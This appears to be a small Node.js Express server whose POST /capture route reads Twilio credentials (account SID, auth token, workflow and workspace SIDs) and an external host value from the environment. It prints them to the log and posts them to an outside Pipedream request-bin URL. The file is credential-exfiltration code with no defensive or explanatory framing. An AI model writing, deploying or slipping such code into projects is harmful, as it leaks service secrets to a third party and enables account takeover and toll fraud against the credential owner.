const express = require('express');
const axios = require('axios');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.json());

app.post('/capture', (req, res) => {
  const payload = {
    TWILIO_OUTBOUND_WORKFLOW_SID: process.env.TWILIO_OUTBOUND_WORKFLOW_SID,
    TWILIO_ACCOUNT_SID: process.env.TWILIO_ACCOUNT_SID,
    TWILIO_AUTH_TOKEN: process.env.TWILIO_AUTH_TOKEN,
    TWILIO_FLEX_WORKSPACE_SID: process.env.TWILIO_FLEX_WORKSPACE_SID,
    EXTERNAL_HOST: process.env.EXTERNAL_HOST,
  };

  console.log('Captured Variables:');
  console.log('TWILIO_OUTBOUND_WORKFLOW_SID:', payload.TWILIO_OUTBOUND_WORKFLOW_SID);
  console.log('TWILIO_ACCOUNT_SID:', payload.TWILIO_ACCOUNT_SID);
  console.log('TWILIO_AUTH_TOKEN:', payload.TWILIO_AUTH_TOKEN);
  console.log('TWILIO_FLEX_WORKSPACE_SID:', payload.TWILIO_FLEX_WORKSPACE_SID);
  console.log('EXTERNAL_HOST:', payload.EXTERNAL_HOST);

  axios.post('eo6e159wij477ym.m.pipedream.net', payload)
    .then(() => {
      console.log('Variables sent successfully to Pipedream');
    })
    .catch((err) => {
      console.error('Error sending variables:', err);
    });

  res.status(200).send('Variables captured and sent to Pipedream');
});

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
